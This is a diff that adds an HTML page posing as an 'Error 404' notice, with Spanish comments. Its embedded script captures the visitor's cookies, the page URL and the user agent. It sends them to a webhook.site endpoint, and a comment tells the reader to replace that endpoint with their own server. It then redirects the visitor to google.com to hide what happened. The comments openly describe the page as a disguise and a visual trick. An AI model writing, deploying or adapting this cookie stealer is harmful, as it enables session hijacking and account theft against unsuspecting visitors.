@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Error 404</title> <!-- Disfrazar la página -->
+    <script>
+        // 1. Capturar las cookies
+        const cookies = document.cookie;
+        const url = window.location.href;
+        const userAgent = navigator.userAgent;
+        
+        // 2. Enviar las cookies a tu servidor/webhook (¡Cambia esta URL!)
+        fetch('https://webhook.site/2c804839-039e-4b42-99b0-7c8cdf438ce1', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                cookies: cookies,
+                url: url,
+                userAgent: userAgent,
+                ip: '' // (Se puede obtener con un backend)
+            }),
+        }).then(() => {
+            // 3. Opcional: Redirigir a una página legítima para disimular
+            window.top.location = "https://google.com";
+        }).catch(() => {});
+    </script>
+</head>
+<body>
+    <h1>Página no encontrada</h1> <!-- Engaño visual -->
+</body>
+</html>
